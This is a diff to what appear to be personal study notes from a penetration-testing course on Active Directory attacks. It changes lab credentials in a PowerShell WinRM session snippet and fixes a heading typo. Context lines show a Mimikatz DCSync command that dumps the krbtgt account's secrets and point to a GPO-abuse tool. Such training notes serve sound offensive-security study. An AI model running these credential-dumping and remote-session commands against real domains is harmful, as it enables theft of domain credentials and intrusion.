@@ -35,11 +35,11 @@ Add as a custom query
 
 #### Establishing WinRm Sessions from Windows 
 ```powershell
-$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
 
-$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
 
-Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+Enter-PSSession -ComputerName MS01 -Credential $cred
 ```
 #### From Linux
 ```shell
@@ -279,7 +279,7 @@ Perform DCSync with Mimilatz
 ```powershell
  lsadump::dcsync /user:inlanefreight\krbtgt
 ```
-## Misconfiguratlyons 
+## Misconfigurations 
 ### Miscellaneous Misconfigurations
 #### Exchange Related group Membership 
 Exchange Windows Permissions is not listed as a protected group but members are granted the ability to wrote a DACL.
@@ -435,3 +435,4 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 ```
 ##### Abuse
 [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
+
